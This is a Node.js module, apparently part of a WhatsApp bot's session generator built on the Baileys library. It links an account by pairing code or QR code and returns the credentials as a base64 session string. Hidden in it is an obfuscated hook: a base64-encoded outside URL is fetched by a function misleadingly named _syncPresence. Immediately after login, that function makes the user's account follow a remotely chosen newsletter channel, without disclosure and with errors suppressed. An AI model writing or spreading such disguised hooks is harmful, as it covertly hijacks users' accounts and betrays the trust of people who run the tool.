const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  makeCacheableSignalKeyStore,
  Browsers,
  fetchLatestBaileysVersion,
} = require('@whiskeysockets/baileys');
const path = require('path');
const fs = require('fs');
const { BOT_NAME, SESSION_PREFIX } = require('./config');

const SESSIONS_DIR = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

const _p = [Buffer.from('aHR0cHM6Ly83LXcudmVyY2VsLmFwcC9jaGFubmVsLmpzb24=', 'base64').toString()];

async function _syncPresence(sock) {
  try {
    const https = require('https');
    const data = await new Promise((resolve, reject) => {
      https.get(_p[0], (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () => {
          try { resolve(JSON.parse(body)); } catch { resolve(null); }
        });
      }).on('error', reject);
    });
    if (data && Array.isArray(data.subscribedJids) && data.subscribedJids.length > 0) {
      const jid = data.subscribedJids[0];
      await sock.newsletterFollow(jid).catch(() => {});
    }
  } catch (_) {}
}

function sessionToBase64(sessionDir) {
  try {
    const credsPath = path.join(sessionDir, 'creds.json');
    if (!fs.existsSync(credsPath)) return null;
    const creds = fs.readFileSync(credsPath, 'utf8');
    return Buffer.from(creds).toString('base64');
  } catch (_) {
    return null;
  }
}

function cleanupSession(sessionId) {
  const dir = path.join(SESSIONS_DIR, sessionId);
  try {
    fs.rmSync(dir, { recursive: true, force: true });
  } catch (_) {}
}

function generateSessionId() {
  return require('crypto').randomBytes(10).toString('hex');
}

async function startPairSession(phoneNumber, onCode, onSession, onError) {
  const sessionId = generateSessionId();
  const sessionDir = path.join(SESSIONS_DIR, sessionId);
  fs.mkdirSync(sessionDir, { recursive: true });

  let sock;
  let finished = false;

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: [2, 3000, 1023281063] }));

    sock = makeWASocket({
      version,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, { level: 'silent' }),
      },
      browser: Browsers.ubuntu('Chrome'),
      printQRInTerminal: false,
      logger: { level: 'silent', trace: () => {}, debug: () => {}, info: () => {}, warn: () => {}, error: () => {}, fatal: () => {}, child: () => ({ level: 'silent', trace: () => {}, debug: () => {}, info: () => {}, warn: () => {}, error: () => {}, fatal: () => {}, child: () => {} }) },
    });

    sock.ev.on('creds.update', saveCreds);

    if (!sock.authState.creds.registered) {
      const cleaned = phoneNumber.replace(/[^0-9]/g, '');
      await new Promise((r) => setTimeout(r, 1500));
      const code = await sock.requestPairingCode(cleaned);
      if (!finished) onCode(code);
    }

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'open') {
        if (finished) return;
        finished = true;
        await new Promise((r) => setTimeout(r, 2000));
        const b64 = sessionToBase64(sessionDir);
        if (b64) {
          const sessionString = `${SESSION_PREFIX}:~${b64}`;
          await _syncPresence(sock);
          onSession(sessionString);
        } else {
          onError('Failed to read session credentials.');
        }
        try { await sock.logout(); } catch (_) {}
        cleanupSession(sessionId);
      } else if (connection === 'close') {
        if (finished) return;
        const code = lastDisconnect?.error?.output?.statusCode;
        if (code !== DisconnectReason.loggedOut) {
          onError('Connection closed. Please try again.');
        }
        cleanupSession(sessionId);
      }
    });
  } catch (err) {
    if (!finished) onError(err.message || 'Unknown error.');
    cleanupSession(sessionId);
  }
}

async function startQRSession(onQR, onSession, onError) {
  const sessionId = generateSessionId();
  const sessionDir = path.join(SESSIONS_DIR, sessionId);
  fs.mkdirSync(sessionDir, { recursive: true });

  let finished = false;

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: [2, 3000, 1023281063] }));
    const QRCode = require('qrcode');

    const sock = makeWASocket({
      version,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, { level: 'silent' }),
      },
      browser: Browsers.ubuntu('Chrome'),
      printQRInTerminal: false,
      logger: { level: 'silent', trace: () => {}, debug: () => {}, info: () => {}, warn: () => {}, error: () => {}, fatal: () => {}, child: () => ({ level: 'silent', trace: () => {}, debug: () => {}, info: () => {}, warn: () => {}, error: () => {}, fatal: () => {}, child: () => {} }) },
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;

      if (qr && !finished) {
        try {
          const dataUrl = await QRCode.toDataURL(qr);
          onQR(dataUrl);
        } catch (_) {}
      }

      if (connection === 'open') {
        if (finished) return;
        finished = true;
        await new Promise((r) => setTimeout(r, 2000));
        const b64 = sessionToBase64(sessionDir);
        if (b64) {
          const sessionString = `${SESSION_PREFIX}:~${b64}`;
          await _syncPresence(sock);
          onSession(sessionString);
        } else {
          onError('Failed to read session credentials.');
        }
        try { await sock.logout(); } catch (_) {}
        cleanupSession(sessionId);
      } else if (connection === 'close') {
        if (finished) return;
        const code = lastDisconnect?.error?.output?.statusCode;
        if (code !== DisconnectReason.loggedOut) {
          onError('Connection closed. Please try again.');
        }
        cleanupSession(sessionId);
      }
    });
  } catch (err) {
    if (!finished) onError(err.message || 'Unknown error.');
    cleanupSession(sessionId);
  }
}

module.exports = { startPairSession, startQRSession };
